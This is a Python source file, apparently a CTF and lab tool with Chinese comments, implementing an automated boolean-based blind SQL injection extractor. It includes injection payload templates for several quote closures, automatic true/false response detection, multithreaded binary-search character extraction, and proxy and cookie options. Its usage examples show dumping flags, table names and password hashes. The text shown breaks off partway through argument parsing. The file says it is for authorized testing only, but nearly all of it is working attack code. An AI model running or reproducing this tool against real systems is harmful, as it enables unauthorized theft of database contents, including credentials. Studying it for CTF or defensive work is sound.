#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通用 Boolean-Based SQL 盲注提取脚本
适用范围：CTF / 授权测试 / 本地靶场

特性：
- GET / POST
- Header / Cookie / Proxy
- requests.Session 连接复用
- 线程本地 Session
- 请求重试与随机延迟
- 自动 true_mark 探测：marker / length / status_code 三级策略
- 长度二分探测
- 字符 ASCII 二分 + 可选边界预检 + 等值校验
- 支持线程并发
- 支持断点续传 / 中间结果落盘，带保存节流
- 支持 --hex 自动包装查询结果为 hex(({query}))
- 支持 --probe-closure 自动探测数字型/字符型基础闭合方式
- 可选 verbose 调试输出

注意：请仅在 CTF、靶场或明确授权的环境中使用。
"""

import argparse
import random
import re
from difflib import SequenceMatcher
import string
import sys
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from threading import Lock
from typing import Dict, List, Literal, Optional, Tuple, Union

import requests


# ---------- 颜色支持检测与 Windows 兼容层 ----------
def supports_color() -> bool:
    """检测当前终端是否支持 ANSI 颜色。"""
    if os.getenv("NO_COLOR"):          # 用户主动禁用颜色
        return False
    if not hasattr(sys.stdout, "isatty") or not sys.stdout.isatty():
        return False
    # Windows 需要特别处理
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # 启用虚拟终端处理 (ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004)
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return False
    # Linux / macOS / WSL 等默认支持（只要 isatty 为 True）
    return True

# ---------- 颜色常量（根据支持情况决定是否使用转义码） ----------
if supports_color():
    PURPLE = "\033[95m"
    YELLOW = "\033[93m"
    WHITE  = "\033[97m"
    RESET  = "\033[0m"
else:
    PURPLE = YELLOW = WHITE = RESET = ""

# ---------- 你的 LOGO 保持不变 ----------
LOGO = rf"""
{PURPLE}
      /)/)                -------              |
     ({YELLOW}⚡{PURPLE}.{YELLOW}⚡{PURPLE})                |                  |              *
    o(_(")(")               |                  |       ___
                            |    |   |  |  |   |      /   \   |
                            |    |   |  |  |   |     |————|   |
                            |    |___|  |__|   |____  \___    |
                                                     
     BLIND{YELLOW}⚡{PURPLE}SQLi
{WHITE}  Fast as lightning.                                                
  Silent as a rabbit.
{RESET}
"""





DEFAULT_URL = "http://challenge-65d2371abb28992c.sandbox.ctfhub.com:10800/index.php"
DEFAULT_PARAM = "id"
DEFAULT_TRUE_MARK = "Practice makes perfect."
DEFAULT_QUERY = "select flag from ctfhub.flag"
DEFAULT_PAYLOAD = "1 and ascii(substr(({query}),{i},1))>{mid}"
DEFAULT_EQ_PAYLOAD = "1 and ascii(substr(({query}),{i},1))={mid}"
DEFAULT_LEN_PAYLOAD = "1 and length(({query}))>{mid}"
DEFAULT_TRUE_PAYLOAD = "1 and 1=1"
DEFAULT_FALSE_PAYLOAD = "1 and 1=2"
DEFAULT_MAX_LEN = 128
DEFAULT_CHARSET = string.printable[:95]
DEFAULT_HEX_CHARSET = "0123456789ABCDEFabcdef"
DEFAULT_THREADS = 1
DEFAULT_TIMEOUT = 6.0
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.0
DEFAULT_CLOSURE_TEST_EXPR_TRUE = "1=1"
DEFAULT_CLOSURE_TEST_EXPR_FALSE = "1=2"
UNKNOWN = "?"
CharResult = Union[str, Literal["?"]]

print_lock = Lock()
file_lock = Lock()
thread_local = threading.local()


@dataclass
class Config:
    url: str
    param: str
    query: str
    payload: str
    eq_payload: str
    len_payload: Optional[str]
    true_payload: str
    false_payload: str
    true_mark: str
    check_mode: Literal["marker", "length_gt", "length_lt", "status_code"]
    length_threshold: Optional[float]
    status_code: Optional[int]
    method: str
    timeout: float
    retries: int
    delay: float
    jitter: float
    max_len: int
    threads: int
    charset: str
    no_length_detect: bool
    check_boundary: bool
    probe_closure: bool
    probe_samples: int
    headers: Dict[str, str]
    cookies: Dict[str, str]
    proxies: Optional[Dict[str, str]]
    resume_file: Optional[Path]
    save_every: int
    save_interval: float
    auto_mark: bool
    auto_samples: int
    auto_min_marker_len: int
    auto_lcs_limit: int
    normalize_response: bool
    verbose: bool
    sorted_chars: List[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        self.sorted_chars = sorted(set(self.charset), key=ord)
        if not self.sorted_chars:
            raise ValueError("charset 不能为空")


def parse_kv(items, sep: str) -> Dict[str, str]:
    result = {}
    if not items:
        return result
    for item in items:
        if sep not in item:
            raise ValueError(f"格式错误: {item!r}，应为 key{sep}value")
        k, v = item.split(sep, 1)
        k, v = k.strip(), v.strip()
        if not k:
            raise ValueError(f"键不能为空: {item!r}")
        result[k] = v
    return result


def sleep_before_request(delay: float, jitter: float) -> None:
    wait = delay + random.uniform(0, max(jitter, 0))
    if wait > 0:
        time.sleep(wait)


def get_thread_session() -> requests.Session:
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session


def send_raw(session: requests.Session, cfg: Config, payload: str) -> Optional[requests.Response]:
    for attempt in range(1, cfg.retries + 1):
        sleep_before_request(cfg.delay, cfg.jitter)
        try:
            kwargs = dict(
                headers=cfg.headers,
                cookies=cfg.cookies,
                proxies=cfg.proxies,
                timeout=cfg.timeout,
            )
            if cfg.method.upper() == "GET":
                resp = session.get(cfg.url, params={cfg.param: payload}, **kwargs)
            else:
                resp = session.post(cfg.url, data={cfg.param: payload}, **kwargs)

            if cfg.verbose:
                with print_lock:
                    print(f"\n[debug] {payload} => status={resp.status_code}, len={len(resp.text or '')}")
            return resp
        except requests.RequestException as e:
            if cfg.verbose:
                with print_lock:
                    print(f"\n[debug] 请求失败 attempt={attempt}/{cfg.retries}: {e}")
            if attempt < cfg.retries:
                time.sleep(min(1.0 * attempt, 3.0))
    return None


def evaluate_response(resp: requests.Response, cfg: Config) -> bool:
    text = resp.text or ""
    if cfg.check_mode == "marker":
        return cfg.true_mark in text
    if cfg.check_mode == "length_gt":
        return len(text) > float(cfg.length_threshold or 0)
    if cfg.check_mode == "length_lt":
        return len(text) < float(cfg.length_threshold or 0)
    if cfg.check_mode == "status_code":
        return resp.status_code == int(cfg.status_code or 200)
    raise ValueError(f"未知 check_mode: {cfg.check_mode}")


def send_check(session: requests.Session, cfg: Config, payload: str) -> Optional[bool]:
    resp = send_raw(session, cfg, payload)
    if resp is None:
        return None
    ok = evaluate_response(resp, cfg)
    if cfg.verbose:
        with print_lock:
            print(f"[debug] check={ok}, mode={cfg.check_mode}")
    return ok


def normalize_text(text: str, limit: int) -> str:
    text = text[:limit]
    text = re.sub(r"<!--.*?-->", "", text, flags=re.S)
    text = re.sub(r"\s+", " ", text)
    return text.strip()


def lcs2(a: str, b: str, limit: int) -> str:
    """
    近似 LCS：用 SequenceMatcher 提取稳定匹配块。

    这里不使用传统 DP LCS，原因是网页响应可能很长，O(n*m) 的 DP
    在 10KB+ 页面上会明显变慢甚至占用大量内存。SequenceMatcher 对
    动态页面/WAF 噪声场景通常更实用。
    """
    a, b = a[:limit], b[:limit]
    if not a or not b:
        return ""
    matcher = SequenceMatcher(None, a, b, autojunk=False)
    return "".join(a[i:i + size] for i, _, size in matcher.get_matching_blocks() if size > 0)


def multi_lcs(texts: List[str], limit: int) -> str:
    if not texts:
        return ""
    common = texts[0][:limit]
    for text in texts[1:]:
        common = lcs2(common, text, limit)
        if not common:
            break
    return common


def complement_by_subsequence(whole: str, subseq: str) -> str:
    res = []
    j = 0
    for ch in whole:
        if j < len(subseq) and ch == subseq[j]:
            j += 1
        else:
            res.append(ch)
    return "".join(res)


def longest_common_substring(a: str, b: str, min_len: int) -> str:
    """基于匹配块找最长公共子串，避免传统 DP 的 O(n*m) 内存开销。"""
    if not a or not b:
        return ""
    matcher = SequenceMatcher(None, a, b, autojunk=False)
    best = ""
    for i, _, size in matcher.get_matching_blocks():
        if size > len(best):
            best = a[i:i + size]
    return best if len(best) >= min_len else ""


def multi_common_substring(texts: List[str], min_len: int) -> str:
    """在多段文本中寻找稳定公共子串。"""
    if not texts:
        return ""
    candidate = min(texts, key=len)
    for text in texts:
        if text is candidate:
            continue
        candidate = longest_common_substring(candidate, text, min_len)
        if len(candidate) < min_len:
            return ""
    return candidate


def collect_baselines(session: requests.Session, cfg: Config) -> Tuple[List[requests.Response], List[requests.Response]]:
    true_resps, false_resps = [], []
    print(f"[*] 自动探测响应特征，采样次数={cfg.auto_samples}...")
    for _ in range(cfg.auto_samples):
        tr = send_raw(session, cfg, cfg.true_payload)
        fr = send_raw(session, cfg, cfg.false_payload)
        if tr is None or fr is None:
            raise RuntimeError("基准请求失败，无法自动识别 true/false 特征")
        true_resps.append(tr)
        false_resps.append(fr)
    return true_resps, false_resps


def auto_detect_true_feature(session: requests.Session, cfg: Config) -> None:
    true_resps, false_resps = collect_baselines(session, cfg)
    true_texts = [r.text or "" for r in true_resps]
    false_texts = [r.text or "" for r in false_resps]

    if cfg.normalize_response:
        true_texts = [normalize_text(t, cfg.auto_lcs_limit) for t in true_texts]
        false_texts = [normalize_text(t, cfg.auto_lcs_limit) for t in false_texts]
    else:
        true_texts = [t[:cfg.auto_lcs_limit] for t in true_texts]
        false_texts = [t[:cfg.auto_lcs_limit] for t in false_texts]

    # 策略 1：稳定 marker。先取组内公共骨架，再对补集求稳定公共子串。
    common_true = multi_lcs(true_texts, cfg.auto_lcs_limit)
    common_false = multi_lcs(false_texts, cfg.auto_lcs_limit)
    true_diffs = [complement_by_subsequence(t, common_true) for t in true_texts]
    false_diffs = [complement_by_subsequence(f, common_false) for f in false_texts]
    marker = multi_common_substring(true_diffs, cfg.auto_min_marker_len)

    if marker and all(marker not in f for f in false_texts + false_diffs):
        cfg.check_mode = "marker"
        cfg.true_mark = marker
        print(f"[+] 自动识别 true_mark: {marker[:80]!r}")
        if verify_auto_feature(session, cfg):
            return
        print("[!] marker 验证失败，降级到长度/状态码策略。")

    # 策略 2：长度阈值。要求两组长度区间没有重叠，并留一点安全间隔。
    # 注意：evaluate_response() 的 length_gt / length_lt 使用的是原始 resp.text 长度，
    # 所以这里也必须使用原始响应长度，不能使用 normalize 后的 true_texts / false_texts。
    true_lens = [len(r.text or "") for r in true_resps]
    false_lens = [len(r.text or "") for r in false_resps]
    min_t, max_t = min(true_lens), max(true_lens)
    min_f, max_f = min(false_lens), max(false_lens)
    gap = max(min_t, min_f) - min(max_t, max_f)
    if max_t < min_f and gap >= 10:
        cfg.check_mode = "length_lt"
        cfg.length_threshold = (max_t + min_f) / 2
        print(f"[+] 自动识别长度规则: len(resp) < {cfg.length_threshold:.1f}")
        if verify_auto_feature(session, cfg):
            return
    if max_f < min_t and gap >= 10:
        cfg.check_mode = "length_gt"
        cfg.length_threshold = (max_f + min_t) / 2
        print(f"[+] 自动识别长度规则: len(resp) > {cfg.length_threshold:.1f}")
        if verify_auto_feature(session, cfg):
            return

    # 策略 3：状态码。
    true_codes = [r.status_code for r in true_resps]
    false_codes = [r.status_code for r in false_resps]
    if len(set(true_codes)) == 1 and true_codes[0] not in set(false_codes):
        cfg.check_mode = "status_code"
        cfg.status_code = true_codes[0]
        print(f"[+] 自动识别状态码规则: status_code == {cfg.status_code}")
        if verify_auto_feature(session, cfg):
            return

    raise RuntimeError("无法自动识别 true/false 响应特征，请手动指定 --true-mark 或调整 --true-payload/--false-payload")


def verify_auto_feature(session: requests.Session, cfg: Config) -> bool:
    tr = send_raw(session, cfg, cfg.true_payload)
    fr = send_raw(session, cfg, cfg.false_payload)
    if tr is None or fr is None:
        return False
    return evaluate_response(tr, cfg) is True and evaluate_response(fr, cfg) is False


def closure_candidates() -> List[Tuple[str, str, str, str]]:
    """
    基础闭合候选。

    返回：name, bool_tpl, gt_tpl, eq_tpl。
    bool_tpl 使用 {expr}，gt_tpl / eq_tpl 使用 {query} {i} {mid}。
    """
    return [
        (
            "numeric",
            "1 and {expr}",
            "1 and ascii(substr(({query}),{i},1))>{mid}",
            "1 and ascii(substr(({query}),{i},1))={mid}",
        ),
        (
            "numeric-comment-dash",
            "1 and {expr}-- -",
            "1 and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1 and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "single-quote",
            "1' and {expr}-- -",
            "1' and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1' and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "double-quote",
            '1" and {expr}-- -',
            '1" and ascii(substr(({query}),{i},1))>{mid}-- -',
            '1" and ascii(substr(({query}),{i},1))={mid}-- -',
        ),
        (
            "single-quote-paren",
            "1') and {expr}-- -",
            "1') and ascii(substr(({query}),{i},1))>{mid}-- -",
            "1') and ascii(substr(({query}),{i},1))={mid}-- -",
        ),
        (
            "double-quote-paren",
            '1") and {expr}-- -',
            '1") and ascii(substr(({query}),{i},1))>{mid}-- -',
            '1") and ascii(substr(({query}),{i},1))={mid}-- -',
        ),
    ]


def raw_request(session: requests.Session, cfg: Config, payload: str) -> Optional[Tuple[int, str]]:
    """发送原始请求，返回 status_code 与响应文本；用于闭合方式探测，不依赖 true_mark。"""
    for attempt in range(1, cfg.retries + 1):
        sleep_before_request(cfg.delay, cfg.jitter)
        try:
            if cfg.method.upper() == "GET":
                resp = session.get(
                    cfg.url,
                    params={cfg.param: payload},
                    headers=cfg.headers,
                    cookies=cfg.cookies,
                    proxies=cfg.proxies,
                    timeout=cfg.timeout,
                )
            else:
                resp = session.post(
                    cfg.url,
                    data={cfg.param: payload},
                    headers=cfg.headers,
                    cookies=cfg.cookies,
                    proxies=cfg.proxies,
                    timeout=cfg.timeout,
                )
            return resp.status_code, resp.text or ""
        except requests.RequestException:
            if attempt < cfg.retries:
                time.sleep(min(1.0 * attempt, 3.0))
    return None


def response_signature(status: int, text: str, limit: int) -> Tuple[int, int, str]:
    """轻量签名：状态码、长度、规范化后的前缀。"""
    normalized = normalize_text(text, limit)
    return status, len(normalized), normalized[:200]


def responses_separable(
    true_items: List[Tuple[int, str]],
    false_items: List[Tuple[int, str]],
    limit: int,
) -> bool:
    """判断真/假响应是否稳定可区分。"""
    if not true_items or not false_items:
        return False

    true_status = [s for s, _ in true_items]
    false_status = [s for s, _ in false_items]
    if len(set(true_status)) == 1 and len(set(false_status)) == 1 and true_status[0] != false_status[0]:
        return True

    true_lens = [len(normalize_text(t, limit)) for _, t in true_items]
    false_lens = [len(normalize_text(t, limit)) for _, t in false_items]
    true_avg = sum(true_lens) / len(true_lens)
    false_avg = sum(false_lens) / len(false_lens)
    true_spread = max(true_lens) - min(true_lens)
    false_spread = max(false_lens) - min(false_lens)
    if abs(true_avg - false_avg) > max(30, true_spread + false_spread + 10):
        return True

    true_sigs = {response_signature(s, t, limit) for s, t in true_items}
    false_sigs = {response_signature(s, t, limit) for s, t in false_items}
    return true_sigs.isdisjoint(false_sigs)


def probe_closure(session: requests.Session, cfg: Config, samples: int = 2) -> bool:
    """
    自动探测基础闭合方式。

    成功后会更新 cfg.payload / cfg.eq_payload / cfg.len_payload / cfg.true_payload / cfg.false_payload。
    这里直接比较真/假原始响应差异，不依赖 cfg.true_mark 或 send_check，
    因此可独立于 --auto-mark 工作。
    """
    print("[*] 正在探测基础闭合方式...")

    original_payload = cfg.payload
    original_eq_payload = cfg.eq_payload
    original_len_payload = cfg.len_payload

    for name, bool_tpl, gt_tpl, eq_tpl in closure_candidates():
        true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
        false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)

        true_items: List[Tuple[int, str]] = []
        false_items: List[Tuple[int, str]] = []
        failed = False

        for _ in range(samples):
            true_resp = raw_request(session, cfg, true_payload)
            false_resp = raw_request(session, cfg, false_payload)
            if true_resp is None or false_resp is None:
                failed = True
                break
            true_items.append(true_resp)
            false_items.append(false_resp)

        if failed:
            continue

        if responses_separable(true_items, false_items, cfg.auto_lcs_limit):
            cfg.payload = gt_tpl
            cfg.eq_payload = eq_tpl
            cfg.len_payload = bool_tpl.format(expr="length(({query}))>{mid}")
            cfg.true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
            cfg.false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)
            print(f"[+] 闭合方式探测成功: {name}")
            if cfg.verbose:
                print(f"[debug] payload     = {cfg.payload}")
                print(f"[debug] eq_payload  = {cfg.eq_payload}")
                print(f"[debug] len_payload = {cfg.len_payload}")
            return True

    cfg.payload = original_payload
    cfg.eq_payload = original_eq_payload
    cfg.len_payload = original_len_payload
    print("[!] 未能自动确认闭合方式，将继续使用当前 payload 模板。")
    return False


def make_len_payload(cfg: Config, mid: int) -> str:
    if cfg.len_payload:
        return cfg.len_payload.format(query=cfg.query, mid=mid)
    return cfg.payload.format(query=f"length(({cfg.query}))", i=1, mid=mid)


def detect_length(session: requests.Session, cfg: Config) -> Optional[int]:
    print("[*] 正在探测结果长度...")
    if cfg.len_payload is None:
        print("[!] 未提供 --len-payload，将使用主 payload 派生长度探测。")
        print('    常见写法: --len-payload "1 and length(({query}))>{mid}"')
        print('    字符型闭合: --len-payload "1\' and length(({query}))>{mid}-- -"')

    gt_max = send_check(session, cfg, make_len_payload(cfg, cfg.max_len))
    if gt_max is None:
        return None
    if gt_max:
        print(f"[!] 结果长度大于 max_len={cfg.max_len}，将按 max_len 提取，结果可能被截断。")
        return cfg.max_len

    left, right = 0, cfg.max_len
    while left < right:
        mid = (left + right) // 2
        result = send_check(session, cfg, make_len_payload(cfg, mid))
        if result is None:
            return None
        if result:
            left = mid + 1
        else:
            right = mid
    print(f"[+] 探测到结果长度: {left}")
    return left


def ascii_gt(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
    return send_check(session, cfg, cfg.payload.format(query=cfg.query, i=pos, mid=value))


def ascii_eq(session: requests.Session, cfg: Config, pos: int, value: int) -> Optional[bool]:
    return send_check(session, cfg, cfg.eq_payload.format(query=cfg.query, i=pos, mid=value))


def binary_search_ascii(session: requests.Session, cfg: Config, pos: int) -> Optional[CharResult]:
    chars = cfg.sorted_chars

    if cfg.check_boundary:
        min_ord, max_ord = ord(chars[0]), ord(chars[-1])
        gt_max = ascii_gt(session, cfg, pos, max_ord)
        if gt_max is None:
            return None
        if gt_max:
            return UNKNOWN
        gt_before_min = ascii_gt(session, cfg, pos, min_ord - 1)
        if gt_before_min is None:
            return None
        if not gt_before_min:
            return UNKNOWN

    lo, hi = 0, len(chars) - 1
    while lo < hi:
        mid_idx = (lo + hi) // 2
        result = ascii_gt(session, cfg, pos, ord(chars[mid_idx]))
        if result is None:
            return None
        if result:
            lo = mid_idx + 1
        else:
            hi = mid_idx

    candidate = chars[lo]
    eq = ascii_eq(session, cfg, pos, ord(candidate))
    if eq is None:
        return None
    return candidate if eq else UNKNOWN


def load_resume(path: Optional[Path], length: int) -> List[Optional[str]]:
    if not path or not path.exists():
        return [None] * length
    data = path.read_text(encoding="utf-8", errors="ignore").rstrip("\n")
    chars: List[Optional[str]] = [None if ch == "\x00" else ch for ch in data[:length]]
    while len(chars) < length:
        chars.append(None)
    known = sum(1 for ch in chars if ch not in (None, UNKNOWN))
    print(f"[+] 已从断点文件读取 {known}/{length} 位。")
    return chars


def save_resume(path: Optional[Path], result_chars: List[Optional[str]]) -> None:
    if not path:
        return
    with file_lock:
        path.write_text("".join(ch if ch is not None else "\x00" for ch in result_chars), encoding="utf-8")


class ResumeSaver:
    def __init__(self, cfg: Config, result_chars: List[Optional[str]]):
        self.cfg = cfg
        self.result_chars = result_chars
        self.last_save = 0.0
        self.changed = 0
        self.lock = Lock()

    def maybe_save(self, force: bool = False) -> None:
        if not self.cfg.resume_file:
            return
        with self.lock:
            now = time.time()
            self.changed += 1
            if force or self.changed >= self.cfg.save_every or now - self.last_save >= self.cfg.save_interval:
                save_resume(self.cfg.resume_file, self.result_chars)
                self.changed = 0
                self.last_save = now


def extract(cfg: Config) -> str:
    main_session = requests.Session()

    if cfg.probe_closure:
        probe_closure(main_session, cfg, samples=cfg.probe_samples)

    if cfg.auto_mark:
        auto_detect_true_feature(main_session, cfg)

    length = cfg.max_len

    if not cfg.no_length_detect:
        detected = detect_length(main_session, cfg)
        if detected is None:
            print("[!] 长度探测失败，改用 max_len 继续。")
        else:
            length = detected

    if length <= 0:
        print("[+] 查询结果为空。")
        return ""

    result_chars = load_resume(cfg.resume_file, length)
    saver = ResumeSaver(cfg, result_chars)
    print(f"[*] 开始提取，共 {length} 位，线程数={cfg.threads}")

    pending = [i for i in range(1, length + 1) if result_chars[i - 1] in (None, UNKNOWN)]
    if not pending:
        final = "".join(ch or UNKNOWN for ch in result_chars)
        print_result(final)
        return final

    if cfg.threads <= 1:
        for pos in pending:
            ch = binary_search_ascii(main_session, cfg, pos)
            if ch is None:
                print(f"\n[!] 第 {pos} 位请求失败，中止。")
                break
            result_chars[pos - 1] = ch
            saver.maybe_save()
            partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
            completed = sum(1 for c in result_chars if c is not None)
            print(f"\r[+] 进度 {completed}/{length}: {partial}", end="", flush=True)
        saver.maybe_save(force=True)
        final = "".join(ch or UNKNOWN for ch in result_chars)
        print_result(final)
        return final

    def worker(pos: int) -> Tuple[int, Optional[CharResult]]:
        return pos, binary_search_ascii(get_thread_session(), cfg, pos)

    completed = sum(1 for c in result_chars if c is not None)
    with ThreadPoolExecutor(max_workers=cfg.threads) as executor:
        futures = {executor.submit(worker, pos): pos for pos in pending}
        for future in as_completed(futures):
            pos = futures[future]
            try:
                _, ch = future.result()
            except Exception as e:
                ch = None
                with print_lock:
                    print(f"\n[!] 第 {pos} 位线程异常: {e}")
            result_chars[pos - 1] = ch if ch is not None else UNKNOWN
            completed += 1
            saver.maybe_save()
            partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
            with print_lock:
                print(f"\r[+] 进度 {completed}/{length}: {partial}", end="", flush=True)

    saver.maybe_save(force=True)
    final = "".join(ch or UNKNOWN for ch in result_chars)
    print_result(final)
    return final


def print_result(result: str) -> None:
    print(f"\n\n{'=' * 50}")
    print(f"[✓] 提取结果: {result}")
    print(f"{'=' * 50}")


def build_query(args) -> Tuple[str, str]:
    query = args.query
    charset = args.charset
    if args.hex:
        query = f"hex(({query}))"
        if args.charset == DEFAULT_CHARSET:
            charset = DEFAULT_HEX_CHARSET
        else:
            print("[!] 已启用 --hex，但检测到你自定义了 --charset，将保留自定义字符集。")
            print(f"    若只提取十六进制字符，建议使用: --charset {DEFAULT_HEX_CHARSET!r}")
    return query, charset


def build_config(args) -> Config:
    headers = parse_kv(args.headers, ":")
    cookies = parse_kv(args.cookies, "=")
    query, charset = build_query(args)

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    if args.threads < 1:
        raise ValueError("threads 必须 >= 1")
    if args.max_len < 1:
        raise ValueError("max-len 必须 >= 1")
    if args.retries < 1:
        raise ValueError("retries 必须 >= 1")
    if args.save_every < 1:
        raise ValueError("save-every 必须 >= 1")
    if args.auto_samples < 2:
        raise ValueError("auto-samples 必须 >= 2")

    return Config(
        url=args.url,
        param=args.param,
        query=query,
        payload=args.payload,
        eq_payload=args.eq_payload,
        len_payload=args.len_payload,
        true_payload=args.true_payload,
        false_payload=args.false_payload,
        true_mark=args.true_mark,
        check_mode="marker",
        length_threshold=None,
        status_code=None,
        method=args.method,
        timeout=args.timeout,
        retries=args.retries,
        delay=args.delay,
        jitter=args.jitter,
        max_len=args.max_len,
        threads=args.threads,
        charset=charset,
        no_length_detect=args.no_length_detect,
        check_boundary=args.check_boundary,
        probe_closure=args.probe_closure,
        probe_samples=args.probe_samples,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        resume_file=Path(args.resume) if args.resume else None,
        save_every=args.save_every,
        save_interval=args.save_interval,
        auto_mark=args.auto_mark,
        auto_samples=args.auto_samples,
        auto_min_marker_len=args.auto_min_marker_len,
        auto_lcs_limit=args.auto_lcs_limit,
        normalize_response=not args.no_normalize,
        verbose=args.verbose,
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="通用 Boolean-Based SQL 盲注提取脚本，仅用于 CTF / 授权测试。",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
示例：

═══════════════════════════════════════════════════════════════
                       经典使用场景示例
═══════════════════════════════════════════════════════════════

1基础用法
python blind_sqli.py 
  -u "http://target.com/index.php" 
  -p "id" 
  -q "select flag from flag_table"   
  --probe-closure                    自动探测数字型/字符型闭合方式（单引号、双引号等）
  --auto-mark                        自动识别 true/false 响应特征（marker/长度/状态码）
  -t 8                               8 线程并发，加快提取速度
  --resume flag.tmp                  保存进度，中断后可继续
  --true-mark "Welcome"              指定true_mark 特征字符串
  --method POST                      指定请求方式
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2    ！！！！！！不使用--probe-closure --auto-mark 必带的参数！！！！！！
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           【*】 已知注入点为数字型
 python blind_sqli.py 
  -u "http://target.com/index.php?id=1" 
  -q "select flag from flag_table" 
  -p "id"
  --true-mark "Welcome"
           【*】 已知注入点为字符型
 python blind_sqli.py 
  -u "http://target.com/index.php?id=1" 
  -p "id" 
  -q "select flag from secret" 
  --true-mark "User found" 
  
  --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -"    大于比较
  --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" 等值效验
  --len-payload "1' and length(({query}))>{mid}-- -"             长度探测


3全自动模式（自动探测闭合 + 自动识别 true/false 特征）
  python blind_sqli.py --probe-closure --auto-mark

4提取 HEX 数据（如密码哈希）
  python blind_sqli.py --hex -q "select password from users limit 0,1"

5字符型注入（单引号闭合）
  python blind_sqli.py \\
    --payload "1' and ascii(substr(({{query}}),{{i}},1))>{{mid}}-- -" \\
    --eq-payload "1' and ascii(substr(({{query}}),{{i}},1))={{mid}}-- -" \\
    --len-payload "1' and length(({{query}}))>{{mid}}-- -" \\
    --true-payload "1' and 1=1-- -" \\
    --false-payload "1' and 1=2-- -"

6高并发 + 断点续传（适合长时间提取）
  python blind_sqli.py -t 8 --resume result.tmp --save-every 10

7使用代理 + 自定义 Header/Cookie
  python blind_sqli.py --proxy http://127.0.0.1:8080 \\
    --headers "User-Agent: Mozilla/5.0" "X-Forwarded-For: 127.0.0.1" \\
    --cookies "PHPSESSID=abc123"

8仅长度探测 + 边界预检（提高稳定性）
  python blind_sqli.py --check-boundary --no-length-detect --max-len 256

9  复制用
python blind_sqli.py -u "http://192.168.81.130/hackhubs/sqli-labs/Less-1/" -p "id" -q "select group_concat(table_name) from information_schema.tables where table_schema='security'" --true-mark "Your Login name:" --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -" --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" --len-payload "1' and length(({query}))>{mid}-- -"



特殊注入闭合方式，例如字符型：
  --payload "1' and ascii(substr(({query}),{i},1))>{mid}-- -" \
  --eq-payload "1' and ascii(substr(({query}),{i},1))={mid}-- -" \
  --len-payload "1' and length(({query}))>{mid}--- " \
  --true-payload "1' and 1=1-- -" \
  --false-payload "1' and 1=2-- -"
""",
    )

    parser.add_argument("-u", "--url", default=DEFAULT_URL, help="目标 URL")
    parser.add_argument("-p", "--param", default=DEFAULT_PARAM, help="注入参数名")
    parser.add_argument("-q", "--query", default=DEFAULT_QUERY, help="要提取的 SQL 查询")

    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="大于判断 payload 模板")
    parser.add_argument("--eq-payload", default=DEFAULT_EQ_PAYLOAD, help="等值校验 payload 模板")
    parser.add_argument("--len-payload", default=DEFAULT_LEN_PAYLOAD, help="长度判断 payload 模板；特殊闭合方式时建议显式指定")
    parser.add_argument("--true-mark", default=DEFAULT_TRUE_MARK, help="条件为真时响应中包含的特征字符串")

    parser.add_argument("--auto-mark", action="store_true", help="自动识别 true/false 响应特征")
    parser.add_argument("--true-payload", default=DEFAULT_TRUE_PAYLOAD, help="自动识别时使用的永真 payload")
    parser.add_argument("--false-payload", default=DEFAULT_FALSE_PAYLOAD, help="自动识别时使用的永假 payload")
    parser.add_argument("--auto-samples", type=int, default=4, help="自动识别采样次数")
    parser.add_argument("--auto-min-marker-len", type=int, default=6, help="自动 marker 最小长度")
    parser.add_argument("--auto-lcs-limit", type=int, default=6000, help="自动识别时最多分析响应前 N 个字符")
    parser.add_argument("--no-normalize", action="store_true", help="自动识别时不压缩空白/移除 HTML 注释")

    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP 方法")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="请求超时秒数")
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="请求失败重试次数")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="固定延迟秒数")
    parser.add_argument("--jitter", type=float, default=0.0, help="随机额外延迟秒数")

    parser.add_argument("--max-len", type=int, default=DEFAULT_MAX_LEN, help="最大提取长度")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="线程数")
    parser.add_argument("--charset", default=DEFAULT_CHARSET, help="猜解字符集")
    parser.add_argument("--hex", action="store_true", help="提取 hex(({query})) 的结果；默认字符集会自动收缩为十六进制字符")
    parser.add_argument("--check-boundary", action="store_true", help="启用字符集边界预检；字符集可能不完整时更稳，但会增加请求")
    parser.add_argument("--probe-closure", action="store_true", help="自动探测基础闭合方式，并生成 payload / eq-payload / len-payload")
